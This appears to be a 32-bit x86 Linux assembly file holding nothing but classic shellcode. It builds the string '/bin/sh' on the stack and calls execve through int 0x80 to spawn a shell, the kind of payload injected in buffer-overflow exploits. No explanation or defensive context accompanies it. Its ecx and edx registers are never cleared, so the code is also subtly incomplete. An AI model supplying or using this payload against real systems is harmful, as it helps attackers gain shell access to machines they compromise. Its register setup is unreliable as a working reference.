BITS 32
global _start

section .text

_start:
    xor eax, eax
    push eax
    push 0xb
    pop eax
    push 0x68732f
    push 0x6e69622f
    mov ebx,esp
    int 0x80
